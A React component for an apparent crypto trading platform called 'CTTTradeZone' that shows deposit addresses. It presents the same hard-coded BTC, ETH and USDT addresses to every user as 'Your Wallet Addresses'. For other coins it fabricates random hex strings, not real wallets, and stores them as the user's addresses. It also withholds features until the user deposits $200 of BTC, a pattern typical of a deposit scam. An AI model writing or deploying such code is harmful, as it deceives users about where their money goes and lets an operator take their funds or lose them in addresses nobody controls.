import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Copy, Check, AlertTriangle, Lock, CheckCircle, Bitcoin } from "lucide-react";
import { toast } from "sonner";
import { CoinPrice } from "@/hooks/useRealtimePrices";

interface WalletAddress {
  id: string;
  coin_symbol: string;
  wallet_address: string;
}

interface WalletAddressesProps {
  coins: CoinPrice[];
  userId: string;
  btcBalance?: number;
  btcPrice?: number;
}

// Fixed CTTTradeZone payment wallet addresses
export const FIXED_BTC_ADDRESS = 'bc1q76qphckpcegrj3qc5y57qr4vvs8p9hprlypsrk';
const FIXED_ETH_ADDRESS = '0x05e25079b12964de29e409E89803ccaF5248876B';
const USDT_NETWORK_ADDRESSES: Record<string, { label: string; address: string }> = {
  TRC20: { label: 'USDT (TRC20 · Tron)', address: 'TFyYSnWZTUyEWJyqWHW4fE6FSwJhtYVq9L' },
  ERC20: { label: 'USDT (ERC20 · Ethereum)', address: '0x05e25079b12964de29e409E89803ccaF5248876B' },
  BEP20: { label: 'USDT (BEP20 · BSC)', address: '0x05e25079b12964de29e409E89803ccaF5248876B' },
};

export const WalletAddresses = ({ coins, userId, btcBalance = 0, btcPrice = 0 }: WalletAddressesProps) => {
  const [addresses, setAddresses] = useState<WalletAddress[]>([]);
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [usdtNetwork, setUsdtNetwork] = useState<'TRC20' | 'ERC20' | 'BEP20'>('TRC20');
  const isWalletActive = btcBalance * btcPrice >= 200;

  useEffect(() => {
    fetchAddresses();
  }, [userId, coins]);

  const fetchAddresses = async () => {
    try {
      const { data, error } = await supabase
        .from('crypto_wallet_addresses')
        .select('*')
        .eq('user_id', userId);

      if (error) throw error;

      setAddresses(data || []);

      const existingSymbols = new Set(data?.map(a => a.coin_symbol) || []);
      const missingCoins = coins.filter(coin => !existingSymbols.has(coin.symbol));

      if (missingCoins.length > 0) {
        await generateMissingAddresses(missingCoins);
      }

      setLoading(false);
    } catch (error: any) {
      console.error('Error fetching addresses:', error);
      toast.error('Failed to load wallet addresses');
      setLoading(false);
    }
  };

  const generateMissingAddresses = async (coins: CoinPrice[]) => {
    try {
      const newAddresses = coins.map(coin => ({
        user_id: userId,
        coin_symbol: coin.symbol,
        wallet_address: generateWalletAddress(coin.symbol),
      }));

      const { error } = await supabase
        .from('crypto_wallet_addresses')
        .insert(newAddresses);

      if (error) throw error;

      await fetchAddresses();
    } catch (error: any) {
      console.error('Error generating addresses:', error);
    }
  };

  const generateWalletAddress = (symbol: string): string => {
    if (symbol === 'BTC') return FIXED_BTC_ADDRESS;
    if (symbol === 'ETH') return FIXED_ETH_ADDRESS;
    if (symbol === 'USDT') return USDT_NETWORK_ADDRESSES.TRC20.address;

    const chars = '0123456789abcdefABCDEF';
    let address = '0x';
    for (let i = 0; i < 40; i++) {
      address += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return address;
  };

  const copyToClipboard = async (address: string, symbol: string) => {
    try {
      await navigator.clipboard.writeText(address);
      setCopiedAddress(address);
      toast.success(`${symbol} address copied!`);
      setTimeout(() => setCopiedAddress(null), 2000);
    } catch (error) {
      toast.error('Failed to copy address');
    }
  };

  const handleLockedAddressClick = () => {
    toast.error('This address is locked. Deposit $200 worth of BTC first to activate your wallet.');
  };

  const sortedCoins = [...coins].sort((a, b) => {
    if (a.symbol === 'BTC') return -1;
    if (b.symbol === 'BTC') return 1;
    return 0;
  });

  if (loading) {
    return (
      <Card>
        <CardHeader>
          <CardTitle>Wallet Addresses</CardTitle>
          <CardDescription>Loading your cryptocurrency wallet addresses...</CardDescription>
        </CardHeader>
      </Card>
    );
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Bitcoin className="h-5 w-5 text-amber-500" />
          Your Wallet Addresses
        </CardTitle>
        <CardDescription>
          Deposit BTC to activate your CTTTradeZone wallet and unlock all features
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        {isWalletActive ? (
          <Alert className="border-green-500/50 bg-green-500/10">
            <CheckCircle className="h-4 w-4 text-green-500" />
            <AlertDescription className="text-green-700 dark:text-green-300">
              <strong>Wallet Activated!</strong> All cryptocurrency addresses are unlocked and ready for deposits.
            </AlertDescription>
          </Alert>
        ) : (
          <Alert className="border-amber-500/50 bg-amber-500/10">
            <AlertTriangle className="h-4 w-4 text-amber-500" />
            <AlertDescription className="text-amber-700 dark:text-amber-300">
              Deposit at least <strong>$200 worth of BTC</strong> to your wallet address below to activate all features.
            </AlertDescription>
          </Alert>
        )}

        <div className="space-y-3">
          {sortedCoins.map((coin) => {
            const address = addresses.find(a => a.coin_symbol === coin.symbol);
            if (!address) return null;

            const isBTC = coin.symbol === 'BTC';
            const isETH = coin.symbol === 'ETH';
            const isUSDT = coin.symbol === 'USDT';
            const isUnlocked = isBTC || isWalletActive;

            let displayAddress = address.wallet_address;
            if (isBTC) displayAddress = FIXED_BTC_ADDRESS;
            else if (isETH) displayAddress = FIXED_ETH_ADDRESS;
            else if (isUSDT) displayAddress = USDT_NETWORK_ADDRESSES[usdtNetwork].address;

            return (
              <div
                key={coin.symbol}
                className={`flex flex-col p-4 rounded-lg border transition-colors ${
                  isUnlocked 
                    ? 'border-green-500 bg-green-500/5 hover:bg-green-500/10' 
                    : 'border-muted bg-muted/30 opacity-75'
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-4 flex-1 min-w-0">
                    {coin.icon_url && (
                      <img 
                        src={coin.icon_url} 
                        alt={coin.name}
                        className={`w-8 h-8 rounded-full ${!isUnlocked && 'grayscale opacity-50'}`}
                      />
                    )}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className={`font-semibold ${!isUnlocked && 'text-muted-foreground'}`}>
                          {coin.name}
                        </span>
                        {isUnlocked ? (
                          <Badge className="bg-green-500 hover:bg-green-600 text-white text-xs">
                            <CheckCircle className="h-3 w-3 mr-1" />
                            {isBTC ? 'ACTIVE DEPOSIT' : 'ACTIVE'}
                          </Badge>
                        ) : (
                          <Badge variant="outline" className="border-amber-500 text-amber-600 dark:text-amber-400 text-xs">
                            <Lock className="h-3 w-3 mr-1" />
                            ACTIVATION REQUIRED
                          </Badge>
                        )}
                        {isUSDT && isUnlocked && (
                          <Badge variant="secondary" className="text-xs">{usdtNetwork}</Badge>
                        )}
                      </div>
                      <div className={`text-sm truncate font-mono ${
                        isUnlocked ? 'text-muted-foreground' : 'text-muted-foreground/50'
                      }`}>
                        {displayAddress}
                      </div>
                    </div>
                  </div>
                  {isUnlocked ? (
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => copyToClipboard(displayAddress, coin.symbol)}
                      className="flex-shrink-0 border-green-500 text-green-600 hover:bg-green-500/10"
                    >
                      {copiedAddress === displayAddress ? (
                        <>
                          <Check className="h-4 w-4 mr-1" />
                          Copied
                        </>
                      ) : (
                        <>
                          <Copy className="h-4 w-4 mr-1" />
                          Copy
                        </>
                      )}
                    </Button>
                  ) : (
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={handleLockedAddressClick}
                      disabled
                      className="flex-shrink-0 opacity-50 cursor-not-allowed"
                    >
                      <Lock className="h-4 w-4 mr-1" />
                      Locked
                    </Button>
                  )}
                </div>

                {isUSDT && isUnlocked && (
                  <div className="mt-3 pl-12 space-y-1">
                    <label className="text-xs text-muted-foreground">Preferred network</label>
                    <Select value={usdtNetwork} onValueChange={(v) => setUsdtNetwork(v as any)}>
                      <SelectTrigger className="h-9 w-full sm:w-64">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        {Object.entries(USDT_NETWORK_ADDRESSES).map(([key, cfg]) => (
                          <SelectItem key={key} value={key}>{cfg.label}</SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    <p className="text-xs text-amber-600 dark:text-amber-400">
                      Only send USDT on the {usdtNetwork} network to this address. Sending on the wrong network will result in permanent loss.
                    </p>
                  </div>
                )}

                {!isUnlocked && (
                  <p className="text-xs text-muted-foreground mt-2 pl-12">
                    Deposit $200 worth of BTC to unlock this address for deposits
                  </p>
                )}
              </div>
            );
          })}
        </div>
      </CardContent>
    </Card>
  );
};
